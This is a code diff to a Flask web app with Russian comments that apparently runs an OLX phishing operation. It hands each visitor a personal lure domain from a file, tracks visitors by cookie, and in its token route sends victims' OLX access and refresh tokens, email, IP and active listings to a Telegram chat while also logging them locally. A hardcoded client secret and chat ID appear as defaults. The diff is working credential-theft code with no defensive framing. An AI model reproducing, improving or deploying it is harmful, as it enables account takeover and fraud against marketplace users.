@@ -1,7 +1,7 @@
-from flask import Flask, request, jsonify, render_template_string
+from flask import Flask, request, jsonify, render_template_string, make_response
 import requests
 import os
-import sqlite3
+import datetime
 
 app = Flask(__name__)
 
@@ -11,20 +11,6 @@ TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "-1003455979409")
 CLIENT_ID = os.environ.get("CLIENT_ID", "202421")
 CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf")
 REDIRECT_URI = os.environ.get("REDIRECT_URI", "https://verif-olx-com-phi.vercel.app/")
-
-# ---- Инициализация БД ----
-def init_db():
-    with sqlite3.connect('database.db') as conn:
-        cursor = conn.cursor()
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS visitors (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                ip TEXT,
-                user_agent TEXT,
-                personal_link TEXT
-            )
-        ''')
-        conn.commit()
 
 # ---- Функция отправки сообщений в Telegram ----
 def send_telegram_message(msg):
@@ -44,9 +30,8 @@ def send_telegram_message(msg):
 
 # ---- Логика работы с доменами ----
 def get_next_domain_from_file():
-    """Берет первую строку из domens.txt и удаляет её. Если пусто — шлет алерт в ТГ."""
     file_path = 'domens.txt'
-    fallback_link = "https://www.olx.ua/" # Ссылка, если домены кончились
+    fallback_link = "https://www.olx.ua/"
 
     if not os.path.exists(file_path):
         send_telegram_message("⚠️ <b>КРИТИЧЕСКАЯ ОШИБКА:</b> Файл <code>domens.txt</code> не найден!")
@@ -56,46 +41,46 @@ def get_next_domain_from_file():
         lines = f.readlines()
 
     if not lines:
-        send_telegram_message("🚫 <b>ВНИМАНИЕ:</b> Ссылки в <code>domens.txt</code> закончились! Срочно пополни файл.")
+        send_telegram_message("🚫 <b>ВНИМАНИЕ:</b> Ссылки в <code>domens.txt</code> закончились!")
         return fallback_link
 
     selected_link = lines[0].strip()
     
-    # Перезаписываем файл без первой строки
     with open(file_path, 'w', encoding='utf-8') as f:
         f.writelines(lines[1:])
         
     return selected_link
 
-# ---- Главная страница ----
+# ---- Главная страница (С КУКАМИ ВМЕСТО SQLITE) ----
 @app.route('/')
 def index():
     user_ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent')
     
-    with sqlite3.connect('database.db') as conn:
-        cursor = conn.cursor()
-        # Проверяем старых посетителей
-        cursor.execute("SELECT personal_link FROM visitors WHERE ip = ? AND user_agent = ?", (user_ip, user_agent))
-        result = cursor.fetchone()
+    # 1. Проверяем, есть ли уже ссылка в КУКАХ браузера
+    personal_link = request.cookies.get('user_p_link')
+    is_new_visit = False
+
+    if not personal_link:
+        # 2. Если куки нет — берем новую ссылку из файла
+        personal_link = get_next_domain_from_file()
+        is_new_visit = True
         
-        if result:
-            personal_link = result[0]
-        else:
-            # Новый юзер — выдаем домен
-            personal_link = get_next_domain_from_file()
-            cursor.execute("INSERT INTO visitors (ip, user_agent, personal_link) VALUES (?, ?, ?)", 
-                           (user_ip, user_agent, personal_link))
-            conn.commit()
-            
-            # Уведомляем о выдаче (если это не заглушка)
-            if personal_link != "https://www.olx.ua/":
-                send_telegram_message(f"🆕 <b>Выдана ссылка из файла</b>\n👤 IP: <code>{user_ip}</code>\n🔗 Link: {personal_link}")
+        if personal_link != "https://www.olx.ua/":
+            send_telegram_message(f"🆕 <b>Выдана ссылка</b>\n👤 IP: <code>{user_ip}</code>\n🔗 Link: {personal_link}")
 
     try:
         with open('index.html', 'r', encoding='utf-8') as f:
             html_content = f.read()
-            return render_template_string(html_content, personal_link=personal_link)
+            # Рендерим HTML
+            rendered_html = render_template_string(html_content, personal_link=personal_link)
+            
+            # 3. Создаем ответ и сохраняем куку в браузере на 30 дней
+            response = make_response(rendered_html)
+            if is_new_visit:
+                expire_date = datetime.datetime.now() + datetime.timedelta(days=30)
+                response.set_cookie('user_p_link', personal_link, expires=expire_date)
+            
+            return response
     except Exception as e:
         return f"Ошибка шаблона: {e}", 500
 
@@ -140,17 +125,26 @@ def get_token():
                 if ads_req.status_code == 200:
                     ads_data = ads_req.json().get('data', [])
                     if ads_data:
-                        links = [f"• <a href='{ad.get('url', '#')}'>{ad.get('title', 'Без названия')}</a>" for ad in ads_data]
+                        links = [f"• {ad.get('title', 'Без названия')} ({ad.get('url', '#')})" for ad in ads_data]
                         ads_info = "\n".join(links)
             except: pass
 
-            msg = (f"🚀 <b>НОВЫЙ OLX АВТОРИЗАЦИЯ</b>\n\n👤 <b>Email:</b> <code>{email}</code>\n\n"
-                   f"🔑 <b>Access:</b> <code>{access}</code>\n\n🔄 <b>Refresh:</b> <code>{refresh}</code>\n\n"
+            # ФОРМИРУЕМ СООБЩЕНИЕ ДЛЯ ТГ
+            msg = (f"🚀 <b>НОВЫЙ OLX АВТОРИЗАЦИЯ</b>\n\n"
+                   f"👤 <b>IP:</b> <code>{request.remote_addr}</code>\n"
+                   f"👤 <b>Email:</b> <code>{email}</code>\n\n"
+                   f"🔑 <b>Access:</b> <code>{access}</code>\n\n"
+                   f"🔄 <b>Refresh:</b> <code>{refresh}</code>\n\n"
                    f"📦 <b>Активные объявления:</b>\n{ads_info}")
+            
             send_telegram_message(msg)
+            
+            # ЗАПИСЬ В ЛОКАЛЬНЫЙ ФАЙЛ (если сервер позволит)
+            with open("log.txt", "a", encoding="utf-8") as f:
+                f.write(f"\n{msg}\n" + "-"*30)
+
             return jsonify(res_json), 200
         else:
-            send_telegram_message(f"❌ <b>Ошибка авторизации:</b> {response.status_code}")
             return jsonify({"error": response.text}), response.status_code
 
     except Exception as e:
@@ -158,6 +152,5 @@ def get_token():
         return jsonify({"error": str(e)}), 500
 
 if __name__ == '__main__':
-    init_db()
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
